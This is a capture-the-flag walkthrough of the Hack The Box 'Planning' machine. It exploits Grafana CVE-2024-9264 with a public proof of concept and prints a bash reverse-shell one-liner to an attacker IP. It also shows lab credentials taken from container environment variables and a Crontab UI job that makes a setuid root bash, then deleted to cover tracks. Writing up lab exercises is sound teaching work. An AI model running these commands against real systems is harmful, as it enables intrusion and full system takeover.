# Planning - HTB writeup

a walkthrough of the 'Planning' HTB machine. start with the supplied admin creds, exploit Grafana’s CVE-2024-9264 (DuckDB SQL injection) to get RCE as root inside the Grafana container, grab Grafana’s admin creds and grant yourself elevated permissions!


## Introduction

* **Name:** Planning
* **IP:** 10.10.11.68
* **Platform:** HTB 
* **Challenge Type:** Boot2Root machine
* **Difficulty:** Easy

## Recon

i started with a rustscan scan:

```bash
rustscan -a 10.10.11.68 -- -sC -sV -oN nmap/full-tcp.nmap


PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

the site redirects to `planning.htb`

so we'll add `planning.htb` to `/etc/hosts` 

`echo '10.10.11.68 planning.htb' | sudo tee -a /etc/hosts`

the box also came with an initial credentials:

```
admin:0D5oT70Fq13EvB5r
```

i noted it down


## Enumeration web & subdomains

i brute-forced subdomains with ffuf against the server (host header fuzzing) and found `grafana`:

```bash
ffuf -u http://10.10.11.68 -H "Host: FUZZ.planning.htb" -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
[ SNIP ]
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 98ms]
```

added to `/etc/hosts`:

```
10.10.11.68 planning.htb grafana.planning.htb
```

`planning.htb` is a PHP site (nothing juicy in enroll/contact at first glance). `grafana.planning.htb` shows a Grafana login page. i tried the provided creds there and they worked!! (admin:0D5oT70Fq13EvB5r).

grafana footer shows version **11.0.0**, did some research on the version and its vulnerable to CVE-2024-9264


## Foothold Grafana RCE (CVE-2024-9264)

grafana v11 + DuckDB shellfs extension → possible post-auth SQL/command injection (CVE-2024-9264). there’s a public PoC (nollium). i cloned and ran it:

```bash
git clone https://github.com/nollium/CVE-2024-9264
cd CVE-2024-9264
uv run CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c id http://grafana.planning.htb
# output shows: uid=0(root) gid=0(root) groups=0(root)
```

it works, grafana container runs as root and the exploit executes commands via duckdb/shellfs (command writes to /tmp file, then reads it back).

i swapped in a reverse shell command and listened with `nc`. got a root shell inside the **Grafana container**:

```bash
# on attacker
nc -lnvp 443

# exploit
uv run CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://grafana.planning.htb
# connection -> root@<container-id>
```

upgraded the shell and poked around.



## Pivot: creds in container → ssh to host

inside the container environment variables, i found Grafana admin creds:

```
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

those creds worked to SSH to the **host** (planning.htb):

```bash
ssh enzo@planning.htb
# -> shell on host (Ubuntu 24.04)
cat /home/enzo/user.txt
# -> user flag (collected)
```

so user done

## Host enum find escalation path

on the host i checked `/opt` and found `/opt/crontabs/crontab.db` newline-delimited JSON describing scheduled jobs. content included two jobs:

i downloaded it on my machine and here's what i found: 

* **Grafana backup** (daily): runs `/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz`

  * i noticed the zip password: `P4ssw0rdS0pRi0T3c`
* **Cleanup**: `/root/scripts/cleanup.sh` running every minute

checked `netstat`/`ss` found ports listening on localhost:

* 127.0.0.1:3000 (grafana)
* 127.0.0.1:8000 (HTTP, requires Basic auth)
* 127.0.0.1:43351 (responds 404)
* plus db ports (3306...)

`localhost:8000` returned `401` with `WWW-Authenticate: Basic realm="Restricted Area"` looked like a Crontab UI running on 8000 bound to localhost.



## Crontab UI → root

i couldn’t hit 8000 directly from my machine, so i tunneled it over SSH:

```bash
ssh -L 9001:localhost:8000 enzo@planning.htb
# then browse http://localhost:9001
```

Basic auth accepted `root` + `P4ssw0rdS0pRi0T3c` that was the backup zip password from `crontab.db`. login granted access to **Crontab UI** (runs as root).

Crontab UI lets you create jobs so i created a job that copies `/bin/bash` to `/tmp/0xdf` and makes it setuid+setgid:

```
cp /bin/bash /tmp/b && chmod +sx /tmp/b
```

i hit **Run now** in the UI, then deleted the cron to cover tracks. checked:

```bash
ls -l /tmp/b
# -> -rwsrwsrwx 1 root root ...
```

run it preserving privileges:

```bash
/tmp/b -p
# -> root shell
cat /root/root.txt
# -> root flag (collected)
```

anyways i hoped my writeup helped you in some way, check my other writeups if you want but other then that cya
